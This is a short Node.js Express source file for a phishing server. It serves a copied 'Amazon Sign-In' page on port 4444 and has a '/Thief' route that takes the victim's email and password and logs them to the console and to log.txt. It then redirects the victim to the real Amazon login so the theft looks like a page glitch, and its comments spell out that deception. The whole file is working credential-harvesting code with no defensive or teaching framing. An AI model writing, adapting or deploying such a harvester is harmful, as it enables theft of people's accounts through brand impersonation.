const express = require('express');
const app = express();
const fs = require('fs')
const path = require('path')

const port = 4444;

// Needed to access body.email and body.password
app.use(express.urlencoded({extended: true}));
app.use(express.json())

// Required to serve the static css
app.use(express.static("./"));

app.get('/', function (req, res){
    res.setHeader('Content-Type', 'text/html');
    res.send(fs.readFileSync("Amazon Sign-In.html"));

})

// The modified html will submit a request to this route
app.post("/Thief", function (req, res){
    // The email and password sent from the html form will be printed to the console
    var email = req.body.email;
    var password = req.body.password;
    console.log("Email: " + email);;
    console.log("Password: " + password);
    fs.appendFileSync("log.txt",
    "Email: " + email + "\n" + "Password: " + password + "\n\n"
    );


    // Then redirect the user to the real amazon login page so it looks like
    // it just refreshed/bugged out
    res.redirect("https://www.amazon.com/gp/sign-in.html");
})

app.listen(port, '0.0.0.0');
console.log("Server running on localhost:" + port);